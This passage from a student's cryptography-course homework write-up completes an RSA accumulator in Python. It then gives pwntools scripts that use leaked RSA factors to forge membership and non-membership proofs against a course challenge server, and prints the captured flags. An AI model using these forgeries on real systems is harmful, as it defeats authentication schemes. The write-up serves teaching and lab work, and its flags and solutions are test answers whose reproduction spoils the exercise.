It is more secure, as it prevents phishing, replay, and man-in-the-middle attacks. The private key never leaves the device, and the attestation certificate prevents spoofing or cloning of the device.
It is more convenient, as it does not require remembering or typing passwords or codes. The user only needs to insert the device and provide a second factor such as a fingerprint or a PIN.
It is more scalable, as it can work across thousands of accounts and services that support FIDO2 without sharing any secrets.

## 4. Accumulator

### a)
* Just following the TODO hint and complete the each sub-function
    :::spoiler Exp
    ```python=
    from Crypto.Util.number import getPrime, isPrime, GCD, bytes_to_long, long_to_bytes, inverse
    from random import randrange
    from hashlib import sha256
    import numpy as np
    
    class RSA_Accumulator:
        def __init__(self, Nbits):
            self.Setup(Nbits)       # Run Trusted Setup to get the N of a RSA group
            self.memberSet = []     # The memberSet S
    
        def Setup(self, Nbits):
            '''
            Set up the RSA Group and generate a generator g.
            * RSA Accumulator needs trusted setup from third-party.
              -> The factor of N should not be known by anyone.
            '''
            self.N = getPrime((Nbits+1)//2) * getPrime((Nbits+1)//2)
            self.N = 118166153201091422745075581047834754808656318506582059918250736240527000218333900890558674423046670734337546875938786060887854493354320062840519232300439946274194598991584933262120097035915944139948564721903245872873636662231635587182627311074335128195338000702520696618456950964940369684997735067088270882537
    
            g = randrange(1,self.N)
            while (GCD(g, self.N) != 1 or g == 1):
                g = randrange(1,self.N)        
            self.g = g
            self.g = 102051368806489104968940135232506917072685495379367570526809603586735868728055130832450576227989175359207682641748992283183781107769793076159733250007462779341283086743497222627311279686407991735966924383065162712675112994555587377787405876645776970439432770422301055215461963444317007474211864224999189899243
    
        @staticmethod
        def HashToPrime(content):
            '''
            Hash a content to Prime domain.
            The content must be encoded in bytes.
            '''
            def PrimeTest(p):
                return isPrime(p) and p > 2
    
            def H(_y):
                return bytes_to_long(sha256(_y).digest())
    
            y = H(content)
            while not PrimeTest(y):
                y = H(long_to_bytes(y))
    
            return y
    
        def add(self, content):
            '''
            Add an content to memberSet
            '''
            s = self.HashToPrime(content)
            self.memberSet.append(s)
    
        def Digest(self):
            '''
            Digest all the contents in memberSet.
            '''
            digest = self.g
            # TODO: Digest all the elements in memberSet.
            #       Hint: digest = g ^ ( product of "all the primes in memberSet"  )
            for i in self.memberSet:
                digest = pow(digest, i, self.N)
    
            return digest
    
        def MembershipProof(self, content):
            m = self.HashToPrime(content)
            if m not in self.memberSet: raise ValueError
    
            proof = self.g
            # TODO: Make a membership proof for m.
            #       Hint: proof = g ^ ( product of "all the primes in memberSet except for m" )
            for i in self.memberSet:
                if m != i:
                    proof = pow(proof, i, self.N)
    
            return proof
    
        def MembershipVerification(self, N, content, d, proof) -> bool:
            m = self.HashToPrime(content)
            # TODO: Verify the membership proof of m.
            #       Hint: Check "proof ^ m == d"
    
            return True if pow(proof, m, self.N) == d else False


        def NonMembershipProof(self, content):
            m = self.HashToPrime(content)
            if m in self.memberSet: raise ValueError
    
            # TODO: Make a non-membership proof for m.
            #       Hint: let delta = product of "all the primes in memberSet except for m.
            #             find (a, b) satisfy a * m + b * delta = 1 
            #             proof = (g^a, b)
            #             p.s. since gcd(m, delta) == 1, you can use xgcd(Extended Euclidean algorithm) to find (a, b)
            def extended_gcd(a, b):
                if a == 0:
                    return b, 0, 1
                else:
                    gcd, x, y = extended_gcd(b % a, a)
                    return gcd, y - (b // a) * x, x
    
            delta = 1
            for i in self.memberSet:
                delta *= i
    
            gcd, a, b = extended_gcd(m, delta)
            result = pow(self.g, a, N)
            return (result, b)
    
        def NonMembershipVerification(self, N, content, d, proof, g):
            m = self.HashToPrime(content)
            # TODO: Verify the non-membership proof of m.
            #       Hint: Check "(g^a)^m * digest^b == g^(a*m + b*delta) == g"
    
            second_power = pow(d, proof[1], N)
            return (pow(proof[0], m, N) * second_power) % N == g
    
    if __name__ == "__main__":
    
        A = RSA_Accumulator(1024)
        A.add(b"Hello!")
        A.add(b"Test!")
        A.add(b"CNS")
        A.add(b"accumulatorrrrrr")
    
        d = A.Digest()
        N = A.N
        g = A.g
        proof = A.MembershipProof(b"accumulatorrrrrr")
        if A.MembershipVerification(N, b"accumulatorrrrrr", d, proof):
            print( "'accumulatorrrrrr' is in the set." )
        else:
            print( "The proof is wrong." )
    
        proof = A.NonMembershipProof(b"QAQ")
        if A.NonMembershipVerification(N, b"QAQ", d, proof, g):
            print( "'QAQ' is not in the set." )
        else:
            print( "The proof is wrong." )
    ```
    :::

### b) Really thx for R11944034 許智翔 for inspiration
* Goal: We have to construct a fake member $m' \notin S$
* We know: 
$$
p=g^{\prod \limits_{s \in S/\{m'\}}S}=g^{\prod \limits_{s \in S}S}=d
$$
* :+1:If we used normal $p$ and normal $m \in S$: 
$$
p^m=g^{\prod \limits_{s \in S/\{m\}}S*m}=g^{\prod \limits_{s \in S}S}=d
$$
* :-1:If we used normal $p$ and new message $m'$: 
$$
p^{m'}=g^{\prod \limits_{s \in S}S \cdot m'}=d^{m'} \neq d
$$
* :+1:If we used fake proof $p'$ and new message $m'$: 
{% raw %}
$$
{p'}^{m'}=d^{{\{m'\}}^{-1} *m'}=d
$$
{% endraw %}
* We can control proof $p'$ and new message $m'$, so we need to construct fake proof $p'$
$$
p' \equiv d^{\{m'\}^{-1}}\ (mod\ N) \equiv p^{\{m'\}^{-1}\ (mod\ \varphi(N))}\ (mod\ N)\ -\ Euler\ Theorem
$$
    :::info
    To achieve this attack, one condition must be met: We have to compute $\varphi (n)$, so we need the private key of RSA
    :::
    Then we can use any member that's not in member set but still can pass the verification.
:::spoiler Whole Script
```python=
from pwn import *
from accumulator import RSA_Accumulator
from Crypto.Util.number import inverse


r = remote('cns.csie.org', 4001)
context.arch = 'amd64'


p = 0xfe7fa2d93be7396c7172a7186f4e561949f53e436a7ed65da22786637b7e76081f65b972be84ea612787a07878c1bf9454edf81059f84158efe34b4207f96d71
q = 0xb76082ea921f3d4729e59d765ff014ad745b6421f1bacc359417e0c2a1aaa318bd96ba0f6476e09bd1db72fa4dfc7fa5aa0ee1bef7bc4f268fb42673e539d3b1
def bad_setup():
    acc = RSA_Accumulator(1024)
    acc.N = p * q
    acc.g = 0xa8ccac65582e3accb0e246c4d79b9d054e85e086b6d5c48df6f79bf60ad4c77d797ba7fdba0b0a83071f16e427bff7d7d7ab768d4694f90a5eef5278201f8848221b998a7f5322a66f9eac87d5d4f801a2af3fa7a983f9678732b6b16b40c2e2b8e5612e9834f2e64b0aa91f91c479113b0d263dc81572f5b5d367d4911008cd
    
    acc.add(b"Member0")
    acc.add(b"Member1")
    acc.add(b"Member2")
    digest = acc.Digest()
    return acc, digest

for i in range(4):
    r.recvline()

phi = (p-1)*(q-1)

acc, digest = bad_setup()
message = b"Member3"    # A new member that is not in member set
m = acc.HashToPrime(message)
inv_m = inverse(m, phi)
proof_new = pow(digest, inv_m, acc.N)   # Construct a fake proof

r.sendline(b'0')
r.sendline(message)
r.sendline(str(proof_new).encode())

r.interactive()
```
:::
Flag: `cns{ph4k3_m3m83r5H1p!}`

### c)
Like the previous question mentioned, we'd like to give a fake proof that can pass the verification process even the member is not in member set.
* We know that if $gcd(m,\ delta)=1$, then we can find coefficient $a$ and $b$ so that $a\cdot m+b\cdot delta=1$: 
$$
delta={\prod \limits_{s \in S}s}
$$
* :+1:If we used normal $p$ and normal $m \in S$: 
$$
(g^a)^m\cdot d^b=g^{a\cdot m}\cdot g^{b\cdot ({\prod \limits_{s \in S}s})}=g^{a\cdot m+b\cdot ({\prod \limits_{s \in S}s})}=g
$$
* :-1:If we used normal $proof=(g^a, b)$ and new message $m'$: 
You can not find $a$ and $b$ to fit $a\cdot m+b\cdot delta=1$
* :+1:If we used fake proof $proof'=(g^{a'}, b')$ and new message $m'$:
If $a'=m^{-1}, b=0$
$$
(g^{a'})^m\cdot d^b=g^{m^{-1}\cdot m}\cdot g^{b\cdot ({\prod \limits_{s \in S}s})}=g^{1+0}=g
$$
:::spoiler Whole Script
```python=
from pwn import *
from accumulator import RSA_Accumulator
from Crypto.Util.number import inverse


r = remote('cns.csie.org', 4001)
context.arch = 'amd64'


p = 0xfe7fa2d93be7396c7172a7186f4e561949f53e436a7ed65da22786637b7e76081f65b972be84ea612787a07878c1bf9454edf81059f84158efe34b4207f96d71
q = 0xb76082ea921f3d4729e59d765ff014ad745b6421f1bacc359417e0c2a1aaa318bd96ba0f6476e09bd1db72fa4dfc7fa5aa0ee1bef7bc4f268fb42673e539d3b1
def bad_setup():
    acc = RSA_Accumulator(1024)
    acc.N = p * q
    acc.g = 0xa8ccac65582e3accb0e246c4d79b9d054e85e086b6d5c48df6f79bf60ad4c77d797ba7fdba0b0a83071f16e427bff7d7d7ab768d4694f90a5eef5278201f8848221b998a7f5322a66f9eac87d5d4f801a2af3fa7a983f9678732b6b16b40c2e2b8e5612e9834f2e64b0aa91f91c479113b0d263dc81572f5b5d367d4911008cd
    
    acc.add(b"Member0")
    acc.add(b"Member1")
    acc.add(b"Member2")
    digest = acc.Digest()
    return acc, digest

for i in range(4):
    r.recvline()

phi = (p-1)*(q-1)

acc, digest = bad_setup()

message = b"Member0"    # A old member that is in member set
proof_fake = acc.NonMembershipProof(message)
m = acc.HashToPrime(message)

'''
Construct fake proof
'''
a = inverse(m, phi)
delta = 1
for i in acc.memberSet:
    delta *= i
b = inverse(delta, phi)
g_a = pow(acc.g, a, acc.N)


r.sendline(b'1')
r.sendline(message)
r.sendline(str(g_a).encode())
r.sendline(b'0')

r.interactive()
```
:::
Flag: `cns{N0N_n0n_m3M83RSh1p!}`

### d)
(Skip)

## Reference

### 1. DDoS
* [使用Wireshark分析並發現DDoS攻擊](https://security.tencent.com/index.php/blog/msg/3)
* [Kali Linux網絡掃描秘籍第六章拒絕服務(二)](https://cloud.tencent.com/developer/article/2182801)
* [NTP放大DDoS攻擊](https://www.cloudflare.com/zh-tw/learning/ddos/ntp-amplification-ddos-attack/)
* [分散式阻斷服務攻擊(DDoS)趨勢與防護](https://www.twcert.org.tw/tw/cp-157-6408-e0c62-1.html)

### 3. Web Authentication

#### Basic Authentication
* [How To Create Flask Web App In Digital Ocean Using App Deployment](https://www.youtube.com/watch?v=G1EVWLjwvrE&ab_channel=TechieBlogging)
* [Python Flask – Read Form Data from Request](https://pythonexamples.org/python-flask-read-form-data-from-request/)

#### Cookie-Based Authentication
* [Get and set cookies with Flask](https://pythonbasics.org/flask-cookies/)
* [Python Flask – Read Form Data from Request](https://pythonexamples.org/python-flask-read-form-data-from-request/)

#### JWT-Based
* [[筆記] 透過 JWT 實作驗證機制](https://medium.com/麥克的半路出家筆記/筆記-透過-jwt-實作驗證機制-2e64d72594f8)
* [JWT(JSON Web Token) — 原理介紹](https://medium.com/企鵝也懂程式設計/jwt-json-web-token-原理介紹-74abfafad7ba)
* [JSON Web Tokens Encoder/Decoder](https://jwt.io/)

#### 3.C
* [在Python中使用GMP（gmpy2）](https://kexue.fm/archives/3026)
* [binascii.Error: Incorrect padding](https://blog.csdn.net/qq_38463737/article/details/117637783)
* [problem in run code gives Error: Non-base32 digit found](https://stackoverflow.com/questions/70762719/problem-in-run-code-gives-error-non-base32-digit-found)
* [pyauth/pyotp](https://github.com/pyauth/pyotp/tree/develop)
* [Week12 - 要在不同Server間驗證JWT好麻煩嗎？RS256提供你一種簡單的選擇 - JWT篇 [Server的終局之戰系列]](https://ithelp.ithome.com.tw/articles/10231212)
* ['bytes' object has no attribute 'oid'](https://stackoverflow.com/questions/75461879/bytes-object-has-no-attribute-oid)
* [EMSA-PKCS1-v1_5 Specification](https://www.rfc-editor.org/rfc/rfc3447#section-9.2)
* [EMSA_PKCS1_V1_5_ENCODE Implementation](https://github.com/pycrypto/pycrypto/blob/master/lib/Crypto/Signature/PKCS1_v1_5.py)
* [Generate PEM file with specified RSA parameter](https://pycryptodome.readthedocs.io/en/latest/src/public_key/rsa.html#Crypto.PublicKey.RSA.construct)
* [How can I generate rsa public key with specified n and e parameter by using openssl?](https://stackoverflow.com/questions/76458680/how-can-i-generate-rsa-public-key-with-specified-n-and-e-parameter-by-using-open)
* [How can I generate JWT token using HMAC? How is the signature created?](https://stackoverflow.com/questions/74063656/how-can-i-generate-jwt-token-using-hmac-how-is-the-signature-created)
* [JWT encoding using HMAC with asymmetric key as secret](https://security.stackexchange.com/questions/187265/jwt-encoding-using-hmac-with-asymmetric-key-as-secret)

#### 3.E
* [X-Forwarded-For](https://xxgblog.com/2018/10/12/x-forwarded-for-header-trick/)
* [Intruder帳密暴力破解與列舉FUZZING找漏洞的好幫手](https://ithelp.ithome.com.tw/articles/10245914)
* [Intruder Attack type & Payloads - 擁有千種姿態的攻擊模式](https://ithelp.ithome.com.tw/articles/10246457)

### 4. Accumulator
* [淺談 RSA Accumulator](https://antonassocareer.medium.com/淺談-rsa-accumulator-與stateless-client-a75f00ad388e)
* [歐拉定理的介紹](https://youtu.be/fm8L6k1lu8E)
* [歐拉函數的觀察](https://youtu.be/CNQeixKoclU)
* [歐拉函數的計算法](https://youtu.be/DzzBZwjjSrY)
* [歐拉定理的論證](https://youtu.be/P8VjTGAQQUo)